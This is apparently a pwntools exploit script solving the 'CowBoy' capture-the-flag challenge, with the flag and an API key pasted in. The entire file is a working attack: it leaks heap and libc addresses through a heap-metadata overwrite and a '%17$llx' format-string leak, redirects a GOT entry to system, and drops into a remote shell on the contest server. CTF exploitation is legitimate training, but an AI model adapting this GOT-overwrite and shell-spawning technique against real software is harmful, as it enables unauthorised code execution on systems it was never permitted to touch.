from pwn import *
from ctypes import *
import sys
# flag : SCTF{H4v3_y0u_ev3r_seen_CowBoy_B1B0P?}
HOST = "cowboy.eatpwnnosleep.com"
PORT = 14697
REMOTE = 1
import json
a = {
    'apikey' : "a7d4eeae97f394fc427ebfac74e8158c9aa578136716cc72e081edce445ba3e2",
}
if(REMOTE):
  	s = remote(HOST,PORT)
	clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
	clib.srand(clib.time(0))
else:
  	#s = remote('192.168.33.10',PORT)
	s = process("./CowBoy_fb009bfafd91a8c5211c959cc3a5fc7a4ae8ad5d")
	clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
	clib.srand(clib.time(0))

#s.send(json.dumps(a).encode())
#top = int("0x"+os.popen("./get ").read()[:-1],16) + 0x177f
def alloc(size):
	s.recvuntil('5. exit')
	s.sendline('1')
	s.recvuntil('malloc!')
	s.sendline(str(size))

def fill(bins, num, dat):
	s.recvuntil('5. exit')
	s.sendline('4')
	time.sleep(0.5)
	#s.recvuntil('num? :')
	s.sendline(str(bins))
	#s.recvuntil('num? :')
	time.sleep(0.5)
	s.sendline(str(num))
	#s.recvuntil('input:')
	time.sleep(0.5)
	s.send(dat)

def free(bins,num):
	s.recvuntil('5. exit')
	s.sendline('2')
	time.sleep(0.5)
	#s.recvuntil('num? :')
	s.sendline(str(bins))
	time.sleep(0.5)
	#s.recvuntil('num? :')
	s.sendline(str(num))
	
#print hex(top)
alloc(16)
s.recvuntil('ding_malloc(16) = ')
heap = int(s.recv(6*2+2),16)
print hex(heap)
alloc(16)
alloc(16)
alloc(0x100) # heap + 0x4000
fill(0,0,p64(0x0)+p64(heap+0x4000))
alloc(16)
fill(4,0,p64(0x00602018)+p64(0))
fill(0,4,p64(0x04007B0))
fill(4,0,"%17$llx")
s.recvuntil('input: ')
libc = int(s.recv(6*2),16) - 0x20830
print hex(libc)
raw_input()
fill(4,0,p64(0x00602018)+p64(0))
fill(0,4,p64(libc+0x45390))
s.interactive()
